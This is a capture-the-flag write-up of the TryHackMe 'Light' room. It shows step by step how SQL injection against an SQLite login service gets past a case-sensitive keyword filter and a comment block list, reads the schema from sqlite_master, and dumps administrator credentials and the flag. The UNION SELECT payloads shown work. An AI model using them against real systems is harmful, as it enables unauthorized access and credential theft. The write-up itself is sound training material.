---
title: "TryHackMe: Light"
author: Vitorx
categories: [TryHackMe]
tags: [sql, sql injection, sqlite]
render_with_liquid: false
img_path: /images/tryhackme_light/
image:
  path: /images/tryhackme_light/light-tryhackme.webp
---

**Light** is a `TryHackMe` challenge focused on `SQL Injection` in an SQLite database. The objective is to exploit a vulnerable application to obtain administrator credentials and the final flag. The challenge teaches essential SQL Injection exploitation techniques, highlighting the importance of proper security measures such as input validation and parameterized queries. You can access it by clicking [here](https://tryhackme.com/r/room/lightroom).

## Discovering SQL Injection

According to the room instructions, when connecting to the service on port `1337`, we encounter a database application.

```console
$ rlwrap nc 10.10.184.219 1337
```
The system returns a message indicating that we are interacting with a database called Light:

```console
Welcome to the Light database!
Please enter your username:
```

The room also suggests using the username `smokey` to start the session. Upon entering it, we receive the corresponding password:

```console
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

Since we are dealing with a database-driven application, the first exploitation attempt is to test for `SQL Injection` vulnerability. To do this, we use a simple `'` (single quote) as input. If the system does not properly handle inputs, this attempt may trigger a revealing error:

```console
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

The error indicates that the application might be vulnerable, as the input broke the original SQL query.

## Attempting UNION SELECT Injection

To extract information from the database, we attempt a `UNION-based` SQL Injection to merge our query with another table.

```console
Please enter your username: ' UNION SELECT 1-- -
```

However, the system returns an unusual error, stating that certain characters and sequences like `/*`, `--`, and `%0b` are not allowed:

```console
Please enter your username: ' UNION SELECT 1-- -
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```
This means the application has a filtering mechanism to prevent common `SQL Injection` attacks.

## Bypassing Keyword Restrictions

Since we cannot comment out the query to prevent errors, we need to adapt the payload. As `SELECT 1 ''` is a valid query, we can modify our input as follows:

```console
Please enter your username: ' UNION SELECT 1 '
```
However, doing so results in another restriction:

```console
Please enter your username: ' UNION SELECT 1 '
Ahh there is a word in there I don't like :(
```

It appears that the keywords `UNION` and `SELECT` are blocked. But, by testing different capitalizations, we discover that the filter is case-sensitive:

```console
Please enter your username: UNION
Ahh there is a word in there I don't like :(

Please enter your username: SELECT
Ahh there is a word in there I don't like :(

Please enter your username: Union
Username not found.

Please enter your username: Select
Username not found.
```
This allows us to bypass the filter using alternate capitalization:

```console
Please enter your username: ' Union Select 1 '
```

With this, we successfully execute the injection!

```console
Please enter your username: ' Union Select 1 '
Password: 1
```

## Identifying the Database Management System (DBMS)

Now that we have successfully performed a UNION-based injection, we can determine which database management system (DBMS) is being used. We try some common functions:

```console
Please enter your username: ' Union Select version() '
Error: no such function: version
```

```console
Please enter your username: ' Union Select USER_ID(1) '
Error: no such function: USER_ID
```

When we try the function `sqlite_version()`, we finally get a valid response:

```console
Please enter your username: ' Union Select sqlite_version() '
Password: 3.31.1
```

## Extracting the Database Structure

Knowing that we are in an SQLite environment, we can list the tables and their respective structures by querying the internal `sqlite_master` table:

```console
Please enter your username: ' Union Select group_concat(sql) FROM sqlite_master '
```

The response reveals the database structure:

```console
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

Now we know that there are at least two relevant tables: usertable and admintable.

## Extracting Sensitive Data

Our goal is to obtain the administrator's credentials. We can do this by extracting the `username` and `password` fields from the `admintable`:

```console
Please enter your username: ' Union Select group_concat(username || ":" || password) FROM admintable '
Password: VHJ5SGFja01lQWRtaW46bWFtWnRBdU1scnNFeTVicDZxMTcsZmxhZzpUSU17U1FMaXQzX0luSjNjVGlvbl9pc19TaW1wbGVfbk99
```

## Conclusion

In this exploration, we used several techniques to perform an `SQL Injection` attack on an `SQLite database`:

✅ Identified the vulnerability by testing a simple input (''); \
✅ Bypassed keyword restrictions using alternate capitalization; \
✅ Confirmed the database was SQLite by executing version queries; \
✅ Extracted the database structure using sqlite_master; \
✅ Retrieved credentials and the flag via a UNION SELECT.

These methods demonstrate how SQL Injection remains a critical vulnerability and how an attacker can exploit this flaw to extract confidential information from insecure systems.

Always validate user inputs and use parameterized queries to prevent such exploitation! 🚀
